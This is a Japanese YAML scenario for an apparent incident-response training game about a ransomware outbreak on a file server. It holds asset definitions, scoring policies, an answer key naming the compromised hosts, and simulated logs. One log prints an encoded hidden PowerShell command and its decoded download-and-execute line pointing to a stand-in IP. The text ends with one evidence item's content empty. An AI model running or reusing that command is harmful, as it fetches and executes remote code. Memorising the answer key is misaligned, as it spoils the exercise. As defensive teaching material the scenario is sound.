schema_version: "0.4"

meta:
  id: ransomware-initial-response-01
  title: "深夜のファイルサーバ異常"
  version: "1.4.0"   # v1.42: 3台目の侵害資産。安い手が正直に空振りを返す（再現率を下げる誤導）
  author: "IR Dojo"
  license: "CC-BY-4.0"
  estimated_play_minutes: 10
  language: ja
  default_policy: damage_minimization
  default_assist_level: assisted
  briefing: |
    03:12、監視センターから連絡。ファイルサーバ fs01 で
    大量のファイル名変更が検知された。あなたは当直の
    インシデント対応担当として招集された。

    社内は 6 台の管理対象がある小規模拠点で、深夜帯の
    在席者はいない。監視センターからの一次情報は
    「fs01 でファイル名が次々に変わっている」のみである。
  tags: [ransomware, initial-response, misleading-evidence]

world:
  assets:
    - id: dc01
      label: "ドメインコントローラ"
      criticality: critical
      depends_on: []
      business_impact_per_hour: 80

    - id: fs01
      label: "ファイルサーバ"
      criticality: high
      depends_on: [dc01]
      business_impact_per_hour: 50

    # 端末の business_impact_per_hour は「その端末を止めると、何の仕事が
    # 止まるか」で決める。**盤面が言っている重要度と噛み合っていること。**
    # v1.38 まで端末は一律 2〜4/h で、無実の端末を8時間止めても
    # 帯（worst）の 1.3% しか動かなかった。誤導に乗って無関係な端末を
    # 隔離したことが、業務継続最優先でさえ 0.2点しか咎められていない
    # ＝「誤導を追う」代価が方針適合層に一度も現れていなかった。
    - id: ws-042
      label: "営業部端末 (佐藤)"
      criticality: low
      depends_on: [dc01]
      # 担当者1人の営業活動が止まる。期日のある処理は載っていない
      business_impact_per_hour: 2

    - id: ws-107
      label: "経理部端末 (田中)"
      criticality: low
      depends_on: [dc01]
      # 月次処理の最中。止めると締切のある経理業務がそのまま止まる
      business_impact_per_hour: 12

    - id: ws-113
      label: "情報システム部端末 (鈴木)"
      criticality: medium
      depends_on: [dc01]
      # 全端末へのパッチ配布元。止めると拠点全体の保守が止まる
      business_impact_per_hour: 20

    # 誰の担当でもない共用機。**盤面で最も見られていない資産**であり、
    # 管理コンソールへの転送が 3/2 から止まっていることに誰も気付いていない。
    # 止めても止まるのは会議室1室の資料表示だけなので、値段は最も安い
    - id: ws-055
      label: "営業部共用端末 (会議室)"
      criticality: low
      depends_on: [dc01]
      business_impact_per_hour: 4

  ground_truth:
    patient_zero: ws-042
    # **3台目は「疑われなかった」ほうの失敗のために置いてある**（v1.42）。
    # v1.41 まで侵害資産は2つで、どちらも最初の1手（fs01 のログ収集）で
    # 名指しに載った。盤面が教えていた失敗は「無関係なものを疑う」だけで、
    # 実務でより高くつく「侵害されているものを名指ししない」は
    # 一度も起きえなかった（tools/balance.py の27項目も全部そちら側だった）
    compromised: [ws-042, fs01, ws-055]
    persistence: [ws-042]
    innocent: [ws-107, ws-113]
    attack_narrative: |
      3/14 02:17、営業部の ws-042 がフィッシングメール経由で初期侵入を受けた。
      添付された ISO ファイルの中に LNK とローダが同梱されており、
      利用者がマウントして開いたことで難読化された PowerShell が起動している。

      攻撃者は ws-042 上で認証情報を窃取し、02:34 に窃取した
      CORP\sato の資格情報で fs01 の共有へ SMB 接続した。
      02:41 から fs01 上のファイルを順次暗号化し、拡張子を .lockd に変更した。

      ws-042 には Run キーによる永続化が残されている。
      端末を再起動しても再び C2 へ接続する状態にあった。

      02:29、攻撃者は同じ CORP\sato の資格情報で ws-055 へ接続し、
      サービスとして同じローダを登録した。fs01 を暗号化する前に、
      戻れる場所をもう1つ作っている。

      ws-055 は 3/2 のエージェント更新以降、管理コンソールへ
      インベントリとイベントを転送できていない。コンソールが持っているのは
      3/2 時点の姿で、以後この端末で起きたことは、端末のところまで
      行かない限り見えない。転送が止まっていたこと自体は攻撃と無関係で、
      更新の失敗を誰も追っていなかったことによる。

      同時刻に観測された ws-107 の外部通信は、毎日 02:15 に起動する
      クラウドバックアップの定時ジョブである。攻撃とは無関係。
      ws-113 の管理者ログオンも、情報システム部による定例パッチ適用であり
      攻撃とは無関係である。

policies:
  - id: business_continuity
    label: "業務継続最優先"
    briefing: |
      経営判断により、基幹業務の停止は最終手段とする。
      封じ込めは業務影響を最小化する形で実施すること。
      証拠保全は可能な範囲で行えばよい。

      基幹資産（fs01 / dc01）を止める場合は、
      その資産が侵害されている根拠を示せる状態であること。
    weights:
      business_impact:          0.40
      total_damage:             0.25
      containment_completeness: 0.20
      evidence_preserved:       0.15
    constraints:
      - type: forbid_containment_without_evidence
        assets: [fs01, dc01]
        message: "証拠なしに基幹資産を停止することは方針違反です"
      # 全社に「端末を触るな」と流すことは、業務を止めることと同じである。
      # 証拠は残るが、その日の仕事は止まる。この方針の下では取れない手。
      - type: forbid_action
        action_ids: [act_preservation_notice]
        message: "全社への操作停止の周知は、業務を止めます"

  - id: evidence_preservation
    label: "証拠保全最優先"
    briefing: |
      法的対応の可能性があり、証拠保全を最優先とする。
      揮発性証拠の確保を封じ込めに先行させること。

      止める資産ごとに、その資産から揮発性の情報を取ってから止めること。
      別の資産で取れていることは、この要件を満たさない。

      止めた資産は業務から降ろすこと。載せたままでは上書きが続く。
      電源は落とさないこと。稼働中の状態は、落とした時点で取れなくなる。
    weights:
      evidence_preserved:       0.45
      containment_completeness: 0.25
      total_damage:             0.20
      business_impact:          0.10
    constraints:
      # **`require_before` ではこの方針は成立しなかった**（v1.40）。
      # あれは前提タグの付いた手を盤面のどこか1つ押していれば満たされるので、
      # ws-042 のメモリを取った学習者は fs01 を無条件に落とせた。
      # 事実上ほぼ無料の制約で、証拠保全は上位6組まで業務継続と完全に同順
      # ＝ 3本目の方針が2本目の複製になっていた。
      # 「止める資産ごとに、その資産から」に変えて初めて、
      # fs01 の3つの手が方針ごとに割れる。
      - type: require_capture_of_target
        action_type: contain
        prerequisite_tags: [volatile_capture]
        message: "止める資産の揮発性証拠を、止める前に取っていません"
      # fs01 の3つの手のうち、この方針で取れるのは1つだけになる。
      #   境界で遮断 … 共有は業務に載ったままで、原本は上書きされ続ける
      #   電源を落とす … 稼働中の状態は、以後どうやっても取れない
      # 残るのは「動かしたまま、業務から降ろす」= 共有サービスの停止。
      # 業務継続最優先にとって最良の手も、被害最小化最優先にとって
      # 最良の手も、この方針では違反になる（原則4 / 3.8）
      - type: forbid_action
        action_ids: [act_block_smb_fs01, act_shutdown_fs01]
        message: "業務に載せたままにも、電源を落としてもいけません"

  - id: damage_minimization
    label: "被害最小化最優先"
    briefing: |
      被害拡大の阻止を最優先とする。
      業務影響および証拠保全は二次的な考慮事項とする。

      止めるべきものは、根拠が固まる前でも止めてよい。
      半端な遮断で凌がず、確実に止めること。
    weights:
      total_damage:             0.50
      containment_completeness: 0.30
      business_impact:          0.10
      evidence_preserved:       0.10
    constraints:
      # 境界での遮断は迂回されうる（別経路・別資格情報・内部からの再接続）し、
      # 共有サービスを止めてもホストの上で動いているものは動き続ける。
      # 業務継続にとって最良の手（境界で遮断）も、証拠保全にとって最良の手
      # （共有だけ停止）も、この方針では違反になる。
      # ブリーフィングの「半端な遮断で凌がず、確実に止めること」が根拠で、
      # 新しい理屈は足していない（v1.40）
      - type: forbid_action
        action_ids: [act_block_smb_fs01, act_stop_share_fs01]
        message: "遮断や共有の停止では、ホスト上で動いているものは止まらない"
      # 同じ理由が永続化の側にもある。登録を戻すだけの除去は、
      # 見えていない場所に残った分を取りこぼしうる。
      # 丁寧なほうが高くつくのは fs01 と同じ形で、この方針だけが
      # 「安くて確実なほう」を選ばされる（原則4）
      - type: forbid_action
        action_ids: [act_purge_persistence_ws042]
        message: "登録を戻すだけでは取りこぼしうる。この方針では作り直して確実に取り除くこと"

evidence:
  - id: ev_001
    points_to: [ws-042]
    misleading: false
    plausibility: high
    volatile: false
    summary: "ws-042 で深夜に難読化 PowerShell が実行されている"
    reading: |
      EventID 4104 は PowerShell のスクリプトブロックログで、実行された
      スクリプトの中身がそのまま記録される。EventID 4688 はプロセス作成の記録で、
      ParentProcessName から起動元を辿れる。

      コマンドラインの各オプション:
        -enc   続く文字列が Base64（UTF-16LE）であることを示す
        -w hidden  ウィンドウを表示しない
        -nop   プロファイルスクリプトを読み込まない

      SQBFAFgA... をデコードすると次になる:
        IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/a.ps1')

      IEX は Invoke-Expression の別名で、取得した文字列をその場で実行する。
    content: |
      EventID     : 4104
      TimeCreated : 2026-03-14T02:17:33Z
      Computer    : WS-042.corp.local
      UserId      : CORP\sato
      LogName     : Microsoft-Windows-PowerShell/Operational
      ScriptBlockText:
        powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBj
        AHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQ
        AUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMA
        AuADcANwAvAGEALgBwAHMAMQAnACkA

      EventID     : 4688
      TimeCreated : 2026-03-14T02:17:31Z
      Computer    : WS-042.corp.local
      NewProcessName   : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      ParentProcessName: C:\Windows\explorer.exe
      CommandLine      : powershell -nop -w hidden -enc SQBFAFgA...

      収集範囲 : Security / PowerShell-Operational（fs01 に届いた分）
      非対象   : 各端末のローカルにしか残っていないログ

  - id: ev_002
    points_to: [fs01]
    misleading: false
    plausibility: high
    volatile: false
    summary: "fs01 上のファイルが 02:41 以降に大量改変されている"
    reading: |
      ファイル監査ログの行は「時刻 ホスト 旧パス -> 新パス」の形。
      拡張子が一律に同じものへ変わり、各ディレクトリに同一内容のテキストファイルが
      置かれる形は、ファイル暗号化型マルウェアに広く共通する挙動である。

      件数と時間幅（12,847件 / 約29分）から、人手ではなく自動化された処理と読める。
    content: |
      2026-03-14 02:41:07  fs01  \\share\経理\FY2025_予算.xlsx      -> FY2025_予算.xlsx.lockd
      2026-03-14 02:41:07  fs01  \\share\経理\FY2025_実績.xlsx      -> FY2025_実績.xlsx.lockd
      2026-03-14 02:41:09  fs01  \\share\経理\12月_支払一覧.docx    -> 12月_支払一覧.docx.lockd
      2026-03-14 02:41:09  fs01  \\share\営業\顧客名簿.xlsx         -> 顧客名簿.xlsx.lockd
      ...
      合計 12,847 件 (02:41:07 - 03:09:52)

      各ディレクトリに同一内容のファイルが生成されている:
      \\share\経理\_HOW_TO_RESTORE_.txt   (2026-03-14 02:41:07, 1,204 bytes)

  - id: ev_003
    points_to: []
    misleading: false
    plausibility: medium
    volatile: false
    summary: "ws-107 には毎日 02:15 起動の定時バックアップジョブが登録されている"
    reading: |
      バックアップ運用台帳の読み方。「起動時刻」はタスクスケジューラに
      登録された定期実行の時刻、「平均転送量」は過去実績の平均を指す。

      直近30日の実行履歴が 30/30 成功で転送量も 400-520MB に収まっている場合、
      その通信は定常運用の範囲にあると言える。異常かどうかは、この平常時の姿と
      比べて初めて判定できる。
    content: |
      # 資産管理システム / バックアップ運用台帳より抜粋

      対象ホスト : WS-107.corp.local
      ジョブ名   : nightly-cloud-sync
      起動時刻   : 毎日 02:15 (タスクスケジューラ)
      宛先       : backup.example.com (198.51.100.0/24)
      平均転送量 : 420 - 510 MB
      登録日     : 2024-06-03
      登録者     : CORP\suzuki (情報システム部)

      直近30日の実行履歴: 30/30 成功。転送量は 400-520MB の範囲で安定。

  - id: ev_004
    points_to: [ws-042]
    misleading: false
    plausibility: high
    volatile: false
    summary: "ws-042 宛に ISO 添付のフィッシングメールが 02:11 に配送されている"
    reading: |
      メールゲートウェイの配送ログ。認証結果の読み方:
        spf: softfail  送信元IPが差出人ドメインの許可リストにない（緩い失敗）
        dkim: none     電子署名が付いていない

      ISO や VHD の添付は、展開したファイルに Mark-of-the-Web が引き継がれないため、
      Windows の警告表示を回避できる形式として知られる。

      Microsoft-Windows-VHDMP/Operational の EventID 1 は
      ディスクイメージのマウントを記録する。
    content: |
      # メールゲートウェイ配送ログ

      2026-03-14 02:11:48  queue_id=4B2F91A0C7
        from    : billing@example.org
        to      : sato@example.com
        subject : 【至急】3月分 請求書の再送について
        attach  : invoice_202603.iso (1,438,720 bytes)
        spf     : softfail
        dkim    : none
        verdict : delivered (添付形式の隔離ポリシー対象外)

      2026-03-14 02:16:52  WS-042 上で invoice_202603.iso がマウントされている
        (Microsoft-Windows-VHDMP/Operational, EventID 1)
        マウント内容: invoice_202603.lnk, sys32.dll

  - id: ev_005
    points_to: [ws-113]
    misleading: true
    plausibility: medium
    volatile: false
    summary: "ws-113 から深夜に管理者権限のログオンが行われている"
    reading: |
      dc01 のセキュリティログ。
        EventID 4624  ログオン成功
        EventID 4672  特権が割り当てられたログオン
        LogonType 3   ネットワーク経由のログオン（共有アクセス等）

      特権の意味:
        SeBackupPrivilege  アクセス権を無視してファイルを読める
        SeDebugPrivilege   他プロセスのメモリに触れる
        SeTcbPrivilege     OS の一部として動作できる

      深夜帯の管理者ログオンは、攻撃でも保守作業でも同じように記録される。
      記録そのものからは用途を決められない。
    content: |
      # dc01 セキュリティログ

      EventID     : 4624
      TimeCreated : 2026-03-14T02:22:10Z
      Computer    : DC01.corp.local
      TargetUserName : CORP\suzuki_adm
      LogonType   : 3 (Network)
      WorkstationName : WS-113
      IpAddress   : 192.0.2.113

      EventID     : 4672   (特権ログオン)
      TimeCreated : 2026-03-14T02:22:10Z
      TargetUserName : CORP\suzuki_adm
      Privileges  : SeBackupPrivilege, SeDebugPrivilege, SeTcbPrivilege

      以降 02:22 - 03:40 の間に 41 件の同種ログオンが記録されている。
    # **2つ揃って初めて棄却できる誤導。** 台帳（ev_008）が言うのは
    # 「その時間帯に作業が承認されていた」ことであって、記録された
    # ログオンがその作業だったことではない。攻撃者が保守作業の時間帯に
    # 紛れるのは実務でよくある形なので、承認の存在だけでは取り下げられない。
    # 端末側の実行履歴（ev_013）も、収集範囲の外（メモリ上のみ・手動操作）が
    # あるので単独では「何も無かった」を意味しない。
    # 台帳が枠を、端末が中身を埋めて、初めて棄却が成立する。
    refuted_by: [ev_008, ev_013]
    refutation_mode: all

  - id: ev_006
    points_to: [ws-042]
    misleading: false
    plausibility: high
    volatile: false
    summary: "ws-042 から fs01 へ、窃取された資格情報で SMB 接続が行われている"
    reading: |
      fs01 側のログ。
        EventID 4624  ログオン成功（LogonType 3 = ネットワーク）
        EventID 5140  共有オブジェクトへのアクセス

      AccessMask はビットの組み合わせ:
        0x1 ReadData / 0x2 WriteData / 0x10000 Delete

      AuthenticationPackageName は使われた認証方式。ドメイン環境では通常
      Kerberos が使われ、NTLM は資格情報そのものを提示する古い方式である。
      「過去90日で NTLM 0件」はベースラインの提示で、
      普段と違うことが起きたかどうかを判断するための材料になる。
    content: |
      # fs01 SMB セッションログ / セキュリティログ

      EventID     : 4624
      TimeCreated : 2026-03-14T02:34:02Z
      Computer    : FS01.corp.local
      TargetUserName : CORP\sato
      LogonType   : 3 (Network)
      IpAddress   : 192.0.2.42        <- WS-042
      AuthenticationPackageName : NTLM

      過去90日の認証方式内訳 (TargetUserName=CORP\sato):
        Kerberos  1,204 件
        NTLM          0 件

      EventID     : 5140   (共有オブジェクトへのアクセス)
      TimeCreated : 2026-03-14T02:34:04Z
      ShareName   : \\*\share
      AccessMask  : 0x1 (ReadData) | 0x2 (WriteData) | 0x10000 (Delete)

  - id: ev_007
    points_to: [ws-107]
    misleading: true
    plausibility: high
    volatile: false
    summary: "ws-107 が同時刻に外部へ大量通信している"
    reading: |
      NetFlow はパケットの中身を記録せず、通信の外形だけを残す。
        bytes_out  送信バイト数
        bytes_in   受信バイト数
        duration   接続の継続時間（秒）
        ja3        TLS ClientHello の特徴から作るクライアント側の指紋

      ja3 が同じなら同じクライアント実装である可能性が高いが、
      正規のソフトウェアも固有の ja3 を持つ。

      通信量が大きいことは、それ自体では用途を決めない。
      何を送ったかは NetFlow からは分からない。
    content: |
